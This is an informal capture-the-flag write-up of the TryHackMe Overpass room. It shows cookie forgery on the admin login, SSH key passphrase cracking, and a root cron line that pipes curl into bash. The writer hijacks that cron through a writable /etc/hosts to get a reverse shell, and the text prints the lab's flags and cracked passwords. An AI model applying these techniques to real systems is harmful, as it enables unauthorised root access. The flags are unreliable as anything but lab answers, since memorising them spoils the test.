//well...enumeration gonna be funny..there is so much given to us

//let's focus on their about us page first

Ninja - Lead Developer

Pars - Shibe Enthusiast and Emotional Support Animal Manager

Szymex - Head Of Security

Bee - Chief Drinking Water Coordinator

MuirlandOracle - Cryptography Consultant


//its like they gave us potential usernames?

//shall we bruteforce the admin page we found? is it anything in their source code?

//geez..lets focus on admin page then..it's an easy room it can't be something too complicated

//oh the javascript login function

async function login() {
	const usernameBox = document.querySelector("#username");
	const passwordBox = document.querySelector("#password");
	const loginStatus = document.querySelector("#loginStatus");
	loginStatus.textContent = ""
	const creds = { username: usernameBox.value, password: passwordBox.value }
	const response = await postData("/api/login", creds)
	const statusOrCookie = await response.text()
	if (statusOrCookie === "Incorrect credentials") {
		loginStatus.textContent = "Incorrect Credentials"
		passwordBox.value=""
	} else {
		Cookies.set("SessionToken",statusOrCookie)
		window.location = "/admin"
	}
}

//on successful login a SessionToken cookie is created

//lets craft it ourselves..as long as the cookie is named SessionToken we pass

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

//haha poor james...ok lets crack his key with john and rockyou

james13          (james_id_rsa)

james:james13
//those creds tho... and he kept forgetting that? XD poor james

$chmod 600 james_id_rsa

$ssh James@10.10.72.200 -i james_id_rsa
Enter passphrase for key 'james_id_rsa': 
Connection closed by 10.10.72.200 port 22

//ugh...wtf is this again???? yeah it was serverfault error...I just had to wait and now it works

james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
//got FLAG


//another file there
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
They're not updating on the website

//lets privEsc before we got problems again
sudo -l doesnt work this time beacause we dont have james sudo password

//seems like we need to use the overpass build script..I already downloaded it earlier

james@overpass-prod:~$ find / -name 'overpass' 2> /dev/null
/usr/bin/overpass

//ok they got overpass installed
overpass
Welcome to Overpass
Options:
1 Retrieve Password For Service
2 Set or Update Password For Service
3 Delete Password For Service
4 Retrieve All Passwords
5 Exit
Choose an option: 4
System   saydrawnlyingpicture


//we retrieve system password
sudo -l 
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.

//lmao that was a big waste of my time...its definitelly the build script...lets analyze it

//ok lets uplaod linPEAS with a python server and get real informations

╔══════════╣ Cron jobs
...

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash


══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/hosts
/home/james
/run/lock
/run/screen
/run/screen/S-james
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

//ok basically a cron runs every 1 minutes as root and do a curl to overpass.thm
//if its not in dns its a vhost and /etc/hosts is writable

//amazing...we use nano to point overpass.thm to our ip address

cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.8.226.203 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

//that means every 1 min the cron gonna run at /myserverfolder/downloads/src/buildscript.sh

//I just have to make that directory structure in a www folder and make MY buildscript.sh spawn a reverse shell

//I catch that connection in another netcat listenner

//1 minute after i am root

root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}


//for an easy room that privilege escalation was...tedious...but so awesome

//that was so cool making the run from or own server

